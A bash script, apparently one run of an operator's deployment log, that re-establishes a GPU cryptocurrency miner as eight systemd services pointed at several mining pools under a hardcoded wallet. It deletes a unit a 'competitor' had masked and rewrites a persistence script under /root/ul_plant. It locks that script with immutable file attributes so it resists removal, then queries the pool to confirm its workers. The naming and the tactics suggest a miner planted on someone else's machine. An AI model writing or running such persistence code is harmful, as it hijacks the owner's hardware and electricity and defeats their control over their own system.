#!/bin/bash
# i4981 run8: restore systemd layer with a fresh unit name (competitor had masked ul-card@), verify persistence + pool
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname
log "### PRE"
ls -la /etc/systemd/system/ul-card@.service /etc/systemd/system/ul2-card@.service 2>&1 | head -4
echo "procs=$(pgrep -fc 'krig-miner') plh=$(pgrep -fc 'plh-123-184-7-135') cron:"; crontab -l 2>/dev/null | tail -5
systemctl is-active ul-guardloop.service; systemctl list-units --state=active --plain --no-legend 'ul*card@*' | wc -l

log "### FIX-SYSTEMD"
chattr -i /etc/systemd/system/ul-card@.service 2>&1 | head -1
rm -f /etc/systemd/system/ul-card@.service
cat > /etc/systemd/system/ul2-card@.service <<EOS
[Unit]
Description=UL2 PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=-5
ExecStart=/opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g%i --password x -d %i --api-port 14%i
Restart=always
RestartSec=20
TimeoutStopSec=15
LimitNOFILE=65535
EOS
systemctl daemon-reload
pkill -f '/opt/ul2/krig-miner'; sleep 3
for i in 0 1 2 3 4 5 6 7; do systemctl enable --now ul2-card@$i >/dev/null 2>&1; done
sleep 8
echo "units=$(systemctl list-units --state=active --plain --no-legend 'ul2-card@*'|wc -l) procs=$(pgrep -fc 'krig-miner')"
systemctl is-failed ul2-card@0 >/dev/null && journalctl -u ul2-card@0 -n 5 --no-pager | tail -5
sed -i 's#ul-card@#ul2-card@#g' /root/ul_plant/keep.sh 2>/dev/null
chattr -i /root/ul_plant/keep.sh 2>/dev/null; sed -i 's#ul-card@#ul2-card@#g' /root/ul_plant/keep.sh 2>/dev/null; chattr +i /root/ul_plant/keep.sh 2>/dev/null
grep -c 'ul2-card@' /root/ul_plant/keep.sh
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader | head -8

log "### WAIT"
sleep 150
echo "FINAL units=$(systemctl list-units --state=active --plain --no-legend 'ul2-card@*'|wc -l) procs=$(pgrep -fc 'krig-miner') plh=$(pgrep -fc 'plh-123-184-7-135')"
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run8.json; echo size=$(stat -c%s $D/pool_run8.json 2>/dev/null)
python3 - <<'PY'
import json,sys
try: d=json.load(open('/root/ul_farmfan/4981/pool_run8.json'))
except Exception as e: print("PARSE_FAIL",e); sys.exit()
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'),"hr3",r.get('avg_hashrate_3h'))
PY
log "### DONE $(date -u +%FT%TZ)"
